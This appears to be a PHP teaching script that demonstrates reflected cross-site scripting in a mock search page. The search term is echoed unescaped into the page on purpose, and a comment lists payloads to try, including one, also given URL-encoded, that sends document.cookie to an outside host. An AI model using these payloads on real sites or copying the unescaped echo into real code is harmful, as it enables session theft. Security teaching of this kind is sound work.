<?php

/**
 * This script demonstrates an XSS vulnerability
 *
 * DO NOT USE THIS CODE IN PRODUCTION. IT CONTAINS AN INTENTIONAL SECURITY
 * VULNERABILITY.
 *
 * Try typing the following into the search term:
 *
 * " onfocus="alert(document.cookie);"
 * " /><script>i = new Image(); i.src='http://arr.gr/do-evil.php?cookies=' + document.cookie;</script>
 * %22%20%2f%3e%3c%73%63%72%69%70%74%3e%69%20%3d%20%6e%65%77%20%49%6d%61%67%65%28%29%3b%20%69%2e%73%72%63%3d%27%68%74%74%70%3a%2f%2f%61%72%72%2e%67%72%2f%64%6f%2d%65%76%69%6c%2e%70%68%70%3f%63%6f%6f%6b%69%65%73%3d%27%20%2b%20%64%6f%63%75%6d%65%6e%74%2e%63%6f%6f%6b%69%65%3b%3c%2f%73%63%72%69%70%74%3e
 *
 */

session_start();

if (isset($_GET['q'])) {
    $searchTerm = $_GET['q'];
} else {
    $searchTerm = null;
}

?>
<!DOCTYPE html>
<html>
    <head>
        <title>My Cool Site</title>
    </head>

    <body>
        <h1>Search My Cool Site</h1>
        <hr />
        <form>
            <label for="search-query">Enter Search Term:</label>
            <input name="q" id="search" type="text" value="<?php echo $searchTerm ?>" />
            <input type="submit" value="I'm Feeling Secure" />
        </form>
<?php if ($searchTerm): ?>
        <h2>You searched for '<?php echo $searchTerm; ?>'</h2>
        <div>Search results:</div>
        <ul>
            <li>...</li>
            <li>...</li>
            <li>...</li>
        </ul>
<?php endif; ?>
    </body>
</html>